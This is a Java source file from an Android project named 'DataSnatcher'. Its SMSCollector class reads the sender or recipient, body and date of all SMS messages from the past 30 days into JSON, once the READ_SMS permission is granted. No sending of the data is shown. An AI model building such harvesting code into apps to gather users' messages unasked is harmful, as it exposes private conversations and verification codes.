package com.example.DataSnatcher.collector.SMS;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.util.Log;
import androidx.core.content.ContextCompat;
import com.example.DataSnatcher.collector.IInfoCollector;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;


public class SMSCollector implements IInfoCollector {
    private static final String TAG = "SimCardInfoCollector";

    private final Context context;

    // 所需权限
    private static final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.READ_SMS
    };

    public SMSCollector(Context context) {
        if (context == null) {
            throw new IllegalArgumentException("Context 不能为 null");
        }
        this.context = context.getApplicationContext();
    }

    @Override
    public String getCategory() {
        return "SMSInfo";
    }


    @Override
    public JSONObject collect() {
        JSONObject SMSInfoJson = new JSONObject();

        // 检查权限
        boolean hasReadSMSPermission = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;

        if (!hasReadSMSPermission) {
            Log.w(TAG, "缺少必要权限: READ_SMS。无法收集 SMS 信息。");
            try {
                SMSInfoJson.put("error", "缺少 READ_SMS 权限");
                SMSInfoJson.put("Message_count", 0);
                SMSInfoJson.put("Message_list", new JSONArray());
            } catch (JSONException e) {
                Log.e(TAG, "将权限错误信息放入 JSON 时出错", e);
            }
            return SMSInfoJson;
        }

        Uri smsUri = Telephony.Sms.CONTENT_URI;

        String[] projection = new String[]{
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
        };

        int smsCount = 0;
        JSONArray smsArray = new JSONArray();

        long now = System.currentTimeMillis();
        long thirtyDaysAgo = now - 30L * 24 * 60 * 60 * 1000; // 30天前时间戳

        String selection = Telephony.Sms.DATE + " >= ?";
        String[] selectionArgs = new String[]{String.valueOf(thirtyDaysAgo)};

        try (Cursor cursor = context.getContentResolver().query(
                smsUri,
                projection,
                selection,
                selectionArgs,
                Telephony.Sms.DEFAULT_SORT_ORDER  // 时间降序
        )) {
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));  // 1=接收，2=发送
                    String formattedDate = TimeUtils.formatDate(date);
                    JSONObject smsJson = new JSONObject();
                    if (type==1){
                        smsJson.put("发件人", address);
                        smsJson.put("body", body);
                        smsJson.put("date", formattedDate);
                    } else if (type==2) {
                        smsJson.put("收件人", address);
                        smsJson.put("body", body);
                        smsJson.put("date", formattedDate);
                    }

                    smsArray.put(smsJson);
                    smsCount++;
                } while (cursor.moveToNext());
            }
            SMSInfoJson.put("Message_count", smsCount);
            SMSInfoJson.put("Message_list", smsArray);
        } catch (Exception e) {
            Log.e(TAG, "读取短信失败", e);
            try {
                SMSInfoJson.put("error", "读取短信失败: " + e.getMessage());
                SMSInfoJson.put("Message_count", 0);
                SMSInfoJson.put("Message_list", new JSONArray());
            } catch (JSONException jsonException) {
                Log.e(TAG, "将异常信息放入 JSON 时出错", jsonException);
            }
        }

        return SMSInfoJson;
    }

}
